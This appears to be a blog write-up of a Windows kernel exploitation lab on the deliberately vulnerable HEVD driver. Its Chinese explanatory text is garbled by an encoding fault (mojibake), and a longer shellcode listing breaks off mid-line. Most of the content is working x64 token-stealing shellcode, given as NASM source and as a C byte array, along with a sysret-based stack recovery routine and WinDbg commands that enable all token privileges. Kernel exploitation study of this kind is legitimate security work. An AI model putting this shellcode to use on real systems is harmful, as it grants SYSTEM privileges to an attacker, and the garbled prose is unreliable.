<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6065735bb4a5fd9a9d01cdf05b408bc7.png" alt="image-20240119194420366" /></p>
<ol>
<li>
<p>é€šè¿‡<code>EPROCESS</code>è·å¾—è‡ªèº«<code>ActiveProcessLinks</code>ï¼ŒåŒæ—¶å‘å‰/å‘åæŸ¥æ‰¾</p>
<p><a target="_blank" rel="noopener" href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">è¿™ç¯‡æ–‡ç« </a>ä¸­é€šè¿‡æ¨¡ä»¿<code>PsGetCurrentProcess</code>ï¼Œ<code>gs:[188h]</code>æŒ‡å‘çš„æ˜¯ä¸€ä¸ª<code>_KTHREAD </code>ï¼Œå‡½æ•°çš„æ±‡ç¼–ä¼šå°†è¿™ä¸ªåœ°å€<code>add addr,0xb8</code>ï¼Œå°±å¾—åˆ°äº†å½“å‰è¿›ç¨‹çš„<code>_EPROCESS</code>ï¼Œè¿™ä¹Ÿæ˜¯è®¸å¤šshellcodeçš„æŠ€å·§</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7d19f373ab80dd77cee7f9bafa5963c9.png" alt="image-20240120111712416" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/74dee9c22c569abe177a9d8a2227fa80.png" alt="image-20240120112417119" /></p>
<p><code>ffff9984d3d97080 </code>å°±ä¸ºä¸€ä¸ª å½“å‰è¿›ç¨‹çš„<code>KiInitialThread </code></p>
<p><code>+0xB8</code>æŒ‡å‘çš„æ˜¯å½“å‰è¿›ç¨‹çš„<code>EPROCESS</code>äº†</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/264e3eb8c9addd711fc3d6642ba7917a.png" alt="image-20240120112153274" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/253b49550220b0df56641a0ce6cd73b2.png" alt="image-20240120112206849" /></p>
</li>
<li>
<p>æ¯”è¾ƒå½“å‰<code>ActiveProcessLinks</code>å€¼<code>-8</code>çš„å†…å­˜åœ°å€æ˜¯å¦ä¸º<code>UniqueProcessId</code></p>
</li>
<li>
<p>å¦ï¼šæ›´æ¢å½“å‰ç»“æ„ä½“ä¸ºä¸‹ä¸€ä¸ª</p>
</li>
<li>
<p>æ˜¯ï¼šä»<code>ActiveProcessLinks-0x70</code>çš„ä½ç½®å¾—åˆ°<code>Token</code>åœ°å€</p>
</li>
<li>
<p>è§£æTokenï¼Œèµ‹å€¼ç»™<strong>å½“å‰è¿›ç¨‹</strong>ï¼ˆWindowsä¼šè‡ªåŠ¨è§£æä¸ºexpçš„ç¨‹åºï¼ˆä»é¡µè¡¨æ˜ å°„ç­‰æ¥çœ‹ç¡®å®åº”è¯¥å¦‚æ­¤ï¼‰ï¼‰</p>
</li>
</ol>
<p>ä»”ç»†é€†å‘ä¼šå‘ç°</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e3e923aeebb6ddde277f7232637d651d.png" alt="image-20240120105543669" /></p>
<p>é‚£ä¹ˆåœ¨æ²¡æœ‰ä»»ä½•æ ˆå˜åŠ¨çš„æƒ…å†µä¸‹<code>add rsp, 0x28</code>å°±èƒ½æ¢å¤æ ˆï¼Œä½†æ˜¯æˆ‘ä»¬åªæœ‰äº†ROPï¼ŒROPé“¾ä¸­å­˜åœ¨ä¸¤ä¸ª<code>ret</code>å’Œä¸€ä¸ª<code>pop</code>ï¼ŒæŠ¬æ ˆäº†0x18ï¼Œæ‰€ä»¥åœ¨shellcodeä¸­åªéœ€è¦<code>add rsp, 0x10</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dbc0a6a596ddb6db46f6a3a920c17dbf.png" alt="image-20240120105533497" /></p>
<p>åŒæ—¶HEVDçš„<code>NT_STATUS</code>ä½¿ç”¨<code>RAX</code>æ£€æµ‹å¤„ç†æ˜¯å¦æˆåŠŸï¼Œæ‰€ä»¥è¦<code>xor rax,rax</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax+0x188]</span><br><span class="line">    mov rax, [rax+0xb8]     ;rax = å½“å‰EPROCESS</span><br><span class="line">    mov r9, rax             ;r9  = å½“å‰EPROCESS</span><br><span class="line">    mov rax, [rax+0x448]    ;rax = å½“å‰EPROCESS.List</span><br><span class="line">    mov rax, [rax]          ;rax = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax-0x8]      ;rdx = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„ upid</span><br><span class="line">    mov r8, rax             ;r8  = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]          ;rax = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;æ¶ˆé™¤ä½4ä½</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;å½“å‰EPROCESSçš„token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = ç³»ç»Ÿtokené«˜ä½+å½“å‰tokenä½4ä½</span><br><span class="line">    mov [r9+0x4b8], rdx     ;å°†åˆæˆçš„tokenå¤åˆ¶ç»™å½“å‰</span><br><span class="line"></span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨nasm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &quot;C:\Users\xxxx\AppData\Local\bin\NASM\nasm.exe&quot; -f win64 .\TokenSteal.asm -o .\TokenSteal.bin</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘å‡ºçš„æ–‡ä»¶ä½COFFæ ¼å¼ï¼Œè¦æå–å‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯<code>CFF Explore</code>çš„å¿«é€Ÿåæ±‡ç¼–å®šä½åˆ°ä»£ç ç„¶åç”¨<code>HxD</code>æå–çš„</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fd7286caaeb3160933b88c897f0315a3.png" alt="image-20240120110131666" /></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">84</span>] = &#123;</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line">	<span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x10</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c0d0423c8f27b5c1bf5d53ab7948a4b9.png" alt="image-20240120105950658" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/22bab2bb970e84dfa0c194ec6f01567a.png" alt="image-20240120110002444" /></p>
<h2 id="c-åˆ†æä¸Šä¸€ç¯‡çš„shellcode"><a class="markdownIt-Anchor" href="#c-åˆ†æä¸Šä¸€ç¯‡çš„shellcode"></a> C. åˆ†æä¸Šä¸€ç¯‡çš„shellcode</h2>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">	<span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line">	<span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>å†™å…¥ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡æ¡£ï¼Œç”¨idaé€†å‘</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ad5f9f69c5c817f016f3af5ca4717316.png" alt="image-20240119202727334" /></p>
<p>å‘ç°åŸç†ä¸€è‡´ï¼Œæœ€åå¯¹æ ˆçš„æ¢å¤ä¸åŒ</p>
<p>å·²çŸ¥<code>gs:[0x188]</code>æŒ‡å‘ä¸€ä¸ª<code>_KTHREAD</code>ç»“æ„ä½“</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f0a5031af56eee9d505358818846a94e.png" alt="image-20240120112824920" /></p>
<p>æ ¹æ®windbgçš„è°ƒè¯•ç»“æœçŸ¥é“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov cx, [rax+0x1e4]		;+0x1e4 KernelApcDisable : 0n-1</span><br><span class="line">inc cx					;</span><br><span class="line">mov [rax+0x1e4], cx		;æ›´æ–°KernelApcDisableä¸º0</span><br><span class="line">mov rdx, [rax+0x90]		;+0x090 [TrapFrame]: 0xfffff88e`1d2edb00 </span><br><span class="line">						;_KTRAP_FRAME</span><br><span class="line">						;---ä¸‹é¢ä¸º_KTRAP_FRAME</span><br><span class="line">mov rcx, [rdx+0x168]	;[+0x168] Rip</span><br><span class="line">mov r11, [rdx+0x178]	;[+0x178] EFlags</span><br><span class="line">mov rsp, [rdx+0x180]	;[+0x180] Rsp</span><br><span class="line">mov rbp, [rdx+0x158]	;[+0x158] Rbp</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6a427f532364b38c531a30c8e66922c5.png" alt="image-20240120113526235" /></p>
<p>å¯èƒ½è¿˜æ˜¯æœ‰ç‚¹ğŸ˜µï¼Œåæ±‡ç¼–ä¸€ä¸‹<code>TrapFrame</code>çš„RIP</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c053402edbe07075e363de45ec014e8d.png" alt="image-20240120113739799" /></p>
<p>ç›¸å½“äºé€šè¿‡<code>TrapFrame</code>ï¼Œæ›¿æ¢äº†expä¸­çš„<code>DeviceIoControl</code>ï¼ˆæ¨¡ä»¿æ­£å¸¸æ‰§è¡Œï¼‰ï¼Œå¹¶è®©ä»–æ­£å¸¸è¿”å›</p>
<p>æ¥ç€é‡å®šä½GSå¯„å­˜å™¨ï¼Œä½¿ç”¨sysretè¿”å›ï¼Œä¸ºäº†å¯¹é½ï¼Œæœ‰çš„æ±‡ç¼–æ˜¯è¿™æ ·çš„å†™çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o64 sysret	; nasm shit</span><br></pre></td></tr></table></figure>
<h2 id="d-å¼€å¯tokenæ‰€æœ‰æƒé™-ä¼˜åŒ–shellcode"><a class="markdownIt-Anchor" href="#d-å¼€å¯tokenæ‰€æœ‰æƒé™-ä¼˜åŒ–shellcode"></a> D. å¼€å¯Tokenæ‰€æœ‰æƒé™ [ä¼˜åŒ–shellcode]</h2>
<p>å³ä½¿æˆ‘ä»¬å·²ç»æˆåŠŸç”Ÿæˆäº†ä»¤ç‰Œï¼Œä½†æ˜¯åŠŸèƒ½ä¾æ—§æ˜¯ä¸å…¨çš„</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f5b2dd61f571c1edcc1a160ddd63139a.png" alt="image-20240120114406196" /></p>
<p>è¢«ç¦ç”¨çš„åŠŸèƒ½ä¾æ—§æœ‰å¾ˆå¤š</p>
<h3 id="i-å¼€å¯å½“å‰æƒé™ä¸ºå¯ç”¨"><a class="markdownIt-Anchor" href="#i-å¼€å¯å½“å‰æƒé™ä¸ºå¯ç”¨"></a> I. å¼€å¯å½“å‰æƒé™ä¸ºå¯ç”¨</h3>
<p>é‡æ–°æ‰“å¼€ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„<code>cmd.exe</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c2da1e221a9d8e62c9a4ae27901bf004.png" alt="image-20240120125235344" /></p>
<p>ç”¨Aéƒ¨åˆ†çš„æ–¹æ³•æ‰¾åˆ°è¯¥è¿›ç¨‹</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/50a5f3dc61a7e608b21298558bec4cd4.png" alt="image-20240120125516929" /></p>
<p>æŸ¥çœ‹tokenæ ¼å¼ï¼Œå¯¹ç…§ä¸€ä¸‹SIDã€‚ï¼ˆæ³¨æ„ä½ä½è¦ä¸º0ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!token &lt;Tokenæ•°å€¼ï¼Œä½†æ˜¯ä¸ªä½æ•°ä¸º0&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c3cdd2d87ff279e4761888663f50107e.png" alt="image-20240120125615410" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt !_sep_token_privileges 0xffffb106`ecc96060+0x40</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/33d8902ffc4e5dedfac463bebb0bd38e.png" alt="image-20240120130022681" /></p>
<p>å°†Enabledå€¼è®¾ç½®ä¸ºPresentå€¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eq 0xffffb106`ecc96060+0x40+8 0x00000006`02880000</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/cbe5b50b2b24ebedaefea6bf4e406ea0.png" alt="image-20240120130054144" /></p>
<p>æŸ¥çœ‹æƒé™</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d3567ad9cbcbac4a49c839f81cb11751.png" alt="image-20240120130116310" /></p>
<h3 id="ii-è·å¾—æ‰€æœ‰æƒé™å¹¶å¯ç”¨"><a class="markdownIt-Anchor" href="#ii-è·å¾—æ‰€æœ‰æƒé™å¹¶å¯ç”¨"></a> II. è·å¾—æ‰€æœ‰æƒé™å¹¶å¯ç”¨</h3>
<p>ç”¨Aéƒ¨åˆ†çš„æ–¹æ³•å¾—åˆ°Systemçš„Token</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b44eaf47a38695dc4a35d9f25a958054.png" alt="image-20240120130740237" /></p>
<p>å†å¾—åˆ°SystemTokençš„Presentå€¼</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a8398e0631de11a93f09ef3f4d3c4dee.png" alt="image-20240120132052083" /></p>
<p>è®¾ç½®å½“å‰Tokençš„Presentå’ŒEnabledä¸ºè¯¥å€¼</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/70610eb7cea6455cb6dcd0032cb200b3.png" alt="image-20240120132313137" /></p>
<p>æŸ¥çœ‹æƒé™</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/06841330f3a322ab5896df99084d3acf.png" alt="image-20240120132350635" /></p>
<h3 id="iiié‡æ–°ç¼–å†™shellcode"><a class="markdownIt-Anchor" href="#iiié‡æ–°ç¼–å†™shellcode"></a> III.é‡æ–°ç¼–å†™shellcode</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = å½“å‰EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = å½“å‰EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = å½“å‰EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„ upid</span><br><span class="line">    mov r8, rax               ;r8  = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;æ¶ˆé™¤ä½4ä½</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;å½“å‰EPROCESSçš„token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = ç³»ç»Ÿtokené«˜ä½+å½“å‰tokenä½4ä½</span><br><span class="line">    mov [r9+0x4b8], rdx     ;å°†åˆæˆçš„tokenå¤åˆ¶ç»™å½“å‰</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System tokençš„Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = æ–°çš„EPROCESSçš„token</span><br><span class="line">    and rcx, 